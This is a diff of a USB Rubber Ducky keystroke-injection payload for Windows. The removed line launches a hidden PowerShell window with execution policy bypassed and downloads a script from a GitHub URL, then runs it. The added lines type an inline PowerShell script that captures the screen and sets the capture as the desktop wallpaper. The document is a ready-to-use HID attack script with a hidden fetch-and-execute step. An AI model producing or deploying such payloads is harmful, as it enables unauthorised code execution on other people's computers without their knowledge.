@@ -1,4 +1,8 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/Windows-10-XD/rubber-ducky-screenshotbackground/blob/main/script.ps1?dl=1; invoke-expression $pl
+STRING powershell
+ENTER
+DELAY 200
+STRING Add-Type -AssemblyName System.Drawing,System.Windows.Forms; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [Drawing.Point]::Empty, $screen.Size); $bitmap.Save("$env:USERPROFILE\Pictures\screenshot.jpg", [System.Drawing.Imaging.ImageFormat]::Jpeg); $graphics.Dispose(); $bitmap.Dispose(); Start-Sleep -Seconds 2; Add-Type -TypeDefinition 'using System.Runtime.InteropServices; public class Wallpaper { public const uint SPI_SETDESKWALLPAPER = 0x0014; public const uint SPIF_UPDATEINIFILE = 0x01; public const uint SPIF_SENDWININICHANGE = 0x02; [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)] private static extern int SystemParametersInfo (uint uAction, uint uParam, string lpvParam, uint fuWinIni); public static void SetWallpaper (string path) { SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE); }}'; [Wallpaper]::SetWallpaper("$env:USERPROFILE\Pictures\screenshot.jpg")
+DELAY 200
 ENTER
